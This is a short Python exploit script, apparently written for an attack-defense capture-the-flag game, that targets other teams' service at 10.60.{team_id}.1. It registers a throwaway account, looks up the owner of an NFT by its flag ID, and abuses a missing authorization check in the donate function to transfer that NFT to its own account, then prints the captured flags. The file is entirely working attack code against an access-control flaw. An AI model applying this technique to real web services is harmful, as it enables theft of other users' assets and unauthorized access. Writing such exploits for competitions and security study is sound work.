#!/bin/env python3

import sys
from hashlib import sha256
from service1_common import *


def exploit(ip, flag_id):
    u1, p1 = randstr(10), randstr(10)
    c = Client(ip, u1, p1)
    my_id = c.register_user()
    resp = c.view_nft(flag_id)
    user_id = re.search('/user/(.*?)"', resp.text)[1]
    resp = c.donate_nft(flag_id, user_id, my_id)

    # c.close()
    return "\n".join(find_flag(resp.text))


if __name__ == "__main__":
    team_id = sys.argv[1]
    flag_id = sys.argv[2]
    ip = f"10.60.{team_id}.1"
    print(exploit(ip, flag_id))
